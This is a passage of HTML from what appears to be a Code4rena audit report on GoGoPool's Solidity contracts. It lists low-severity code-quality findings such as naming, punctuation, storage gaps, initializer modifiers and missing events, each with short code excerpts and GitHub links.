9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑04] Inconsistent address separator in storage names</h2>\n<p>Most addresses in storage names don’t separate the prefix from the address with a period, but this one has one.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ProtocolDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">102</span><span class=\"mtk1\">  \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getClaimingContractPct</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">claimingContract</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">103</span><span class=\"mtk1\">  \t\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO.ClaimingContractPct.&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">claimingContract</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">  \t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">  \t</span><span class=\"mtk3\">/// @notice Set the percentage a contract is owed for a rewards cycle</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">  \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setClaimingContractPct</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">claimingContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decimal</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGuardian</span><span class=\"mtk1\"> </span><span class=\"mtk11\">valueNotGreaterThanOne</span><span class=\"mtk1\">(</span><span class=\"mtk12\">decimal</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">  \t\t</span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO.ClaimingContractPct.&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">claimingContract</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">decimal</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">: \t}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L102-L109\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L102-L109</a></p>\n<h2 id=\"n05-confusing-function-name\" style=\"position:relative;\"><a href=\"#n05-confusing-function-name\" aria-label=\"n05 confusing function name permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑05] Confusing function name</h2>\n<p>Consider changing the name to <code>stakeGGPAs</code> or <code>stakeGGPFor</code>.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Staking</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">328</span><span class=\"mtk1\">: \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">restakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakerAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlySpecificRegisteredContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ClaimNodeOp&quot;</span><span class=\"mtk1\">, msg.sender) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L328\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L328</a></p>\n<h2 id=\"n06-misplaced-punctuation\" style=\"position:relative;\"><a href=\"#n06-misplaced-punctuation\" aria-label=\"n06 misplaced punctuation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑06] Misplaced punctuation</h2>\n<p>There’s an extra comma - it looks like a find-and-replace error.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">  \t\t</span><span class=\"mtk3\">// Update balances</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">155</span><span class=\"mtk1\">  \t\t</span><span class=\"mtk12\">tokenBalances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">contractKey</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">tokenBalances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">contractKey</span><span class=\"mtk1\">] - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">  \t\t</span><span class=\"mtk3\">// Get the toke ERC20 instance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">157</span><span class=\"mtk1\">  \t\t</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">158</span><span class=\"mtk1\">  \t\t</span><span class=\"mtk3\">// Withdraw to the withdrawal address, , safeTransfer will revert if it fails</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">159</span><span class=\"mtk1\">  \t\t</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">withdrawalAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">160</span><span class=\"mtk1\">: \t}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Vault.sol#L154-L160\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Vault.sol#L154-L160</a></p>\n<h2 id=\"n07-upgradeable-contract-is-missing-a-__gap50-storage-variable-to-allow-for-new-storage-variables-in-later-versions\" style=\"position:relative;\"><a href=\"#n07-upgradeable-contract-is-missing-a-__gap50-storage-variable-to-allow-for-new-storage-variables-in-later-versions\" aria-label=\"n07 upgradeable contract is missing a __gap50 storage variable to allow for new storage variables in later versions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑07] Upgradeable contract is missing a <code>__gap[50]</code> storage variable to allow for new storage variables in later versions</h2>\n<p>See <a href=\"https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps\">this</a> link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TokenggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TokenggAVAX</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Initializable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC4626Upgradeable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">UUPSUpgradeable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">BaseUpgradeable</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L24\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L24</a></p>\n<h2 id=\"n08-import-declarations-should-import-specific-identifiers-rather-than-the-whole-file\" style=\"position:relative;\"><a href=\"#n08-import-declarations-should-import-specific-identifiers-rather-than-the-whole-file\" aria-label=\"n08 import declarations should import specific identifiers rather than the whole file permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑08] Import declarations should import specific identifiers, rather than the whole file</h2>\n<p>Using import declarations of the form <code>import {&#x3C;identifier_name>} from \"some/file.sol\"</code> avoids polluting the symbol namespace making flattened files smaller, and speeds up compilation.</p>\n<p><em>There are 13 instances of this issue. (For in-depth details on this and all further issues with multiple instances, please see the warden’s <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/728\">full report</a>.)</em></p>\n<h2 id=\"n09-missing-initializer-modifier-on-constructor\" style=\"position:relative;\"><a href=\"#n09-missing-initializer-modifier-on-constructor\" aria-label=\"n09 missing initializer modifier on constructor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑09] Missing <code>initializer</code> modifier on constructor</h2>\n<p>OpenZeppelin <a href=\"https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5\">recommends</a> that the <code>initializer</code> modifier be applied to constructors in order to avoid potential griefs, <a href=\"https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/4\">social engineering</a>, or exploits. Ensure that the modifier is applied to the implementation contract. If the default constructor is currently being used, it should be changed to be an explicit one with the modifier applied.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BaseUpgradeable</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BaseUpgradeable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Initializable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">BaseAbstract</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/BaseUpgradeable.sol#L9\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/BaseUpgradeable.sol#L9</a></p>\n<h2 id=\"n10-the-nonreentrant-modifier-should-occur-before-all-other-modifiers\" style=\"position:relative;\"><a href=\"#n10-the-nonreentrant-modifier-should-occur-before-all-other-modifiers\" aria-label=\"n10 the nonreentrant modifier should occur before all other modifiers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑10] The <code>nonReentrant</code> <code>modifier</code> should occur before all other modifiers</h2>\n<p>This is a best-practice to protect against reentrancy in other modifiers.</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h2 id=\"n11-override-function-arguments-that-are-unused-should-have-the-variable-name-removed-or-commented-out-to-avoid-compiler-warnings\" style=\"position:relative;\"><a href=\"#n11-override-function-arguments-that-are-unused-should-have-the-variable-name-removed-or-commented-out-to-avoid-compiler-warnings\" aria-label=\"n11 override function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑11] <code>override</code> function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings</h2>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TokenggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">255</span><span class=\"mtk1\">:  \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_authorizeUpgrade</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newImplementation</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGuardian</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L255\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L255</a></p>\n<h2 id=\"n12-constants-should-be-defined-rather-than-using-magic-numbers\" style=\"position:relative;\"><a href=\"#n12-constants-should-be-defined-rather-than-using-magic-numbers\" aria-label=\"n12 constants should be defined rather than using magic numbers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑12] <code>constant</code>s should be defined rather than using magic numbers</h2>\n<p>Even <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39\">assembly</a> can benefit from using readable constants instead of hex/numeric literals.</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h2 id=\"n13-missing-event-and-or-timelock-for-critical-parameter-change\" style=\"position:relative;\"><a href=\"#n13-missing-event-and-or-timelock-for-critical-parameter-change\" aria-label=\"n13 missing event and or timelock for critical parameter change permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑13] Missing event and or timelock for critical parameter change</h2>\n<p>Events help non-contract tools to track changes, and events prevent users from being surprised by changes.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Storage</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">    \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setGuardian</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">    \t\t</span><span class=\"mtk3\">// Check tx comes from current guardian</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">43</span><span class=\"mtk1\">    \t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">guardian</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">44</span><span class=\"mtk1\">    \t\t\t</span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MustBeGuardian</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">45</span><span class=\"mtk1\">    \t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">    \t\t</span><span class=\"mtk3\">// Store new address awaiting confirmation</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">47</span><span class=\"mtk1\">    \t\t</span><span class=\"mtk12\">newGuardian</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newAddress</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:   \t}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Storage.sol#L41-L48\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Storage.sol#L41-L48</a></p>\n<h2 id=\"n14-events-that-mark-critical-parameter-changes-should-contain-both-the-old-and-the-new-value\" style=\"position:relative;\"><a href=\"#n14-events-that-mark-critical-parameter-changes-should-contain-both-the-old-and-the-new-value\" aria-label=\"n14 events that mark critical parameter changes should contain both the old and the new value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑14] Events that mark critical parameter changes should contain both the old and the new value</h2>\n<p>This should especially be done if the new value is not required to be different from the old value.</p>\n<p><em>There are 2 instances of this issue.</em></p>\n<h2 id=\"n15-use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#n15-use-a-more-recent-version-of-solidity\" aria-label=\"n15 use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path 